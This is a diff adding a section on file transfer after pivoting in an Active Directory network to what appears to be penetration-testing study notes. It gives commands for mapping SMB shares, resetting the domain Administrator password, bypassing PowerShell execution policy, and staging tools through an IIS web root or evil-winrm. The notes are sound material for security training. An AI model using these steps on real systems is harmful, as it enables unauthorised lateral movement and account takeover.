@@ -562,6 +562,52 @@ copy FILE Y:\
 copy Y:\File .\
 ```
 
+#### AD specified situation
+Sometimes you pivoted to an internal facing only computer in an AD environment,
+you might need to transfer files for post exploitation or local enumeration.
+These are the possible ways to do so.
+
+a. SMB
+
+Let say the first computer has a non-default shares
+and you already got admin shell access to the first computer, 
+and you are initally on the second computer with non-privileged access
+and you need to transfer a binary(e.g. sharpup.exe). 
+First step you need to do is enumerate the share name and also its local path, run a powershell command
+```powershell
+# wrap it with powershell -ep bypass if you are having a cmd session
+# Run this in the first computer
+get-smbshare
+```
+Once you have obtained the network share name and the local path.
+In the second computer, you run
+```powershell
+net use X: \\FIRST_COMPUTER_NAME\SHARE_NAME ADMIN_PASSWORD /user:Administrator
+```
+If you don't have admin password, you can modify it with 
+```powershell
+# Run it in the first computer
+net user Administrator NEW_PASSWORD
+```
+Once the net use command executed successfully,
+ you can copy file from Kali to the first computer, 
+then from first computer to second computer, vice versa
+```powershell
+copy X:\FILENAME .\FILENAME
+```
+
+b. HTTP
+
+Sometimes you might not have non default shares that you may write to,
+ but if the first computer has http service running,
+ go to the web root directory(usually C:\\inetpub\\wwwroot).
+ Place files there and retrieve it with wget or other tools like IWR
+
+c. WINRM
+ If you have winrm access with evil-winrm, 
+ you can use the upload and download keywords to transfer files.
+ It is the simplest way to transfer files.
+
 ## 4. Priv Esc
 PE techniques let you get root/administrator access to the system
 ### Local Enumeration Tool
